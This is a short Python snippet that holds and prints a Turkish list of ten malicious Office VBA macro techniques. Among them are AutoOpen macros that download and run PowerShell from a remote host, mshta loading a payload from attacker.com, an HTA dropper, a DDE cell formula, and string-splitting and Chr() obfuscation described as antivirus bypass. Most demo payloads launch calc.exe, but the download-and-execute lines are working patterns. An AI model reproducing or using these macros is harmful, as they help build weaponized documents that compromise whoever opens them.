x = """
VBA Macro Exploit Kod Listesi ve Teknik Yöntemleri
🟦 1. AutoOpen + PowerShell (Temel Shell Tetikleme)
Yöntem: AutoOpen() + PowerShell ile payload indirme


Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')
    Shell cmd, vbHide
End Sub
🟦 2. Document_Open + WScript.Shell (COM Nesnesi)
Yöntem: Document_Open() + COM object ile çalıştırma

Private Sub Document_Open()
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")
    obj.Run "cmd /c calc.exe"
End Sub
🟦 3. Base64 PowerShell Payload
Yöntem: Base64 ile AV bypass amaçlı PowerShell kodu çalıştırma

Sub AutoOpen()
    Dim b64 As String
    b64 = "UwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGMAbwBhAHIAdAAuAGUAeABlAA=="
    Shell "powershell -EncodedCommand " & b64, vbHide
End Sub
🟦 4. HTA Dropper
Yöntem: .hta dosyası yazıp mshta.exe ile çalıştırmak

Sub AutoOpen()
    Dim fso As Object, f As Object, path As String
    Set fso = CreateObject("Scripting.FileSystemObject")
    path = Environ("TEMP") & "\evil.hta"

    Set f = fso.CreateTextFile(path, True)
    f.WriteLine "<script>new ActiveXObject(""WScript.Shell"").Run(""calc.exe"");</script>"
    f.Close

    Shell "mshta.exe " & path, vbHide
End Sub
🟦 5. LOLBAS Kullanımı (mshta.exe üzerinden uzaktan çalıştırma)
Yöntem: mshta ile uzak HTA dosyası çalıştırma

Sub AutoOpen()
    Shell "mshta http://attacker.com/payload.hta", vbHide
End Sub
🟦 6. Hücre Tetiklemeli (Excel Worksheet Event)
Yöntem: Hücre değiştiğinde tetiklenen shell komutu

Private Sub Worksheet_Change(ByVal Target As Range)
    If Target.Address = "$A$1" Then
        Shell "cmd /c calc.exe"
    End If
End Sub
🟦 7. String Parçalama ile AV Bypass
Yöntem: Komutun karakterlerini ayırarak AV kaçışı sağlama

Sub AutoOpen()
    Dim p As String
    p = "pow" & "ers" & "hell -w hidden -nop -c calc"
    Shell p, vbHide
End Sub
🟦 8. Chr() Fonksiyonuyla Encode (AV bypass için)
Yöntem: Komutu ASCII karakterlerle oluşturmak

Sub AutoOpen()
    Dim s As String
    s = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    Shell s & " -w hidden -nop -c calc", vbHide
End Sub
🟦 9. DDE Exploit (Makrosuz)
Yöntem: Excel hücresine DDE komutu yazarak shell çalıştırma

=cmd|'/c calc.exe'!A0
Bu, VBA gerektirmez. Hücreye yazılır.

🟦 10. Steganografi ile Payload Yükleme (Basitleştirilmiş)
Yöntem: Resim dosyasındaki gizli veriyi okuyup çalıştırmak (konsept)


Sub AutoOpen()
    Dim payload As String
    payload = ExtractPayloadFromImage("C:\temp\cover.jpg") ' Sahte fonksiyon
    Shell payload, vbHide
End Sub






"""
print(x)